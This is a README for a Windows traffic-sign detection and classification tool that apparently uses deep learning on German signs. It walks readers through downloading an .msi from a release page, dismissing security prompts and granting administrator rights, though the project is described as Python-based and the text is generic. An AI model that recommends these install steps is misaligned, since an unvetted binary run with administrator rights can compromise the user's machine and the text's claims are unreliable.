# 🚦 traffic-sign-recognition-system - Automatic detection and classification of signs

[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/transpolar-lawrencium17/traffic-sign-recognition-system)

## 📌 What this software does

This application identifies traffic signs in images. It uses a combination of two technologies to find and name signs. First, the program scans an image to locate road signs. It marks the location of each sign it finds using a bounding box. Second, it crops these signs and examines their design to decide what they mean. 

The software recognizes 43 distinct categories of German traffic signs. It supports common image formats. You can use it to process single photos or batches of road images.

## 💻 System requirements

Your computer must meet these requirements to run the software:

* Operating System: Windows 10 or Windows 11
* Processor: Intel Core i5 or equivalent (i7 recommended)
* Memory: 8 GB RAM
* Storage: 2 GB of available disk space
* Graphics: OpenGL 2.0 compatible hardware

## 📥 How to download the software

Follow these steps to get the program on your machine:

1. Visit [this page to download](https://github.com/transpolar-lawrencium17/traffic-sign-recognition-system).
2. Locate the latest release version on the screen.
3. Click the file ending in .msi to start your download.
4. Wait for the transfer to finish in your browser.
5. Open your Downloads folder to find the installer package.

## 🛠️ Setting up the application

Install the software by following these steps:

1. Double-click the downloaded MSI file.
2. Select Run if a security prompt appears.
3. Choose the default installation path.
4. Click Next through the setup screens.
5. Select Install.
6. Provide administrative permission if Windows asks for it.
7. Click Finish once the setup bar reaches the end.

## 🚀 Running the program

Launch the software using the shortcut created on your desktop:

1. Double-click the Traffic Sign Recognition icon.
2. Wait for the main window to open.
3. Select File from the top menu.
4. Click Open Image to choose a photo from your computer.
5. Press the Process button to start the scan.
6. Observe the results in the right-hand panel.

## 🧪 Interpretation of results

The program displays a list of signs found in your image. Each entry includes:

* Confidence score: A percentage showing how sure the software is about the label.
* Label name: The specific type of traffic sign.
* Visual preview: A clipped image showing only the detected sign.

If the software fails to detect a sign, verify the image quality. Blurry or dim photos affect performance. Ensure the sign occupies a clear portion of the frame for the best results.

## ❓ Frequently asked questions

Do I need an internet connection?
No. All detection processing occurs locally on your computer. Your images remain private and do not leave your device.

Does this work on videos?
This version supports static images only. Future updates may include video analysis.

My screen shows an error during startup.
Ensure you have the latest Windows updates installed. Check that your display drivers are current.

The detection feels slow.
Complex images with many signs require more processing time. Close other heavy programs to free up your computer's memory.

## 📂 Troubleshooting common issues

If the application closes unexpectedly, check the hardware acceleration settings. Some older graphics cards have issues with specific rendering modes. Go to Settings, choose Advanced, and toggle Hardware Acceleration to Off. Refresh the app to apply the fix.

Clear the application cache if the program behaves strangely. Navigate to the AppData folder for this user and remove the temporary directory created by the program. Restart the system to finalize the cleanup.

Keep your input files under 5 megabytes for optimal speed. Huge files take longer to load into the memory. Use a standard JPG or PNG format. Avoid unusual file extensions.

Keywords: cnn, computer-vision, deep-learning, gtsrb, image-classification, keras, object-detection, python, pytorch, tensorflow, traffic-sign-recognition, yolov5